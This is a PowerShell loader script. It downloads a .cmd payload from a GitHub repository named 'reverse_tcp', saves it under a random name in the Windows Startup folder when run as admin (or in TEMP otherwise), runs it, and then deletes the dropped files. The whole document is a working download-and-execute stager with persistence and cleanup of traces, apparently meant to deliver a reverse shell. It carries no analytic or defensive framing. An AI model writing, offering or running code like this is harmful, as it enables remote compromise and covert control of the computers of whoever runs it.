$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://github.com/manhnoob37/reverse_tcp/raw/main/donut.cmd'
$DownloadURL2 = 'https://github.com/manhnoob37/reverse_tcp/raw/main/donut.cmd'

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\donut_$rand.cmd" } else { "$env:TEMP\donut_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\donut*.cmd", "$env:TEMP\donut*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
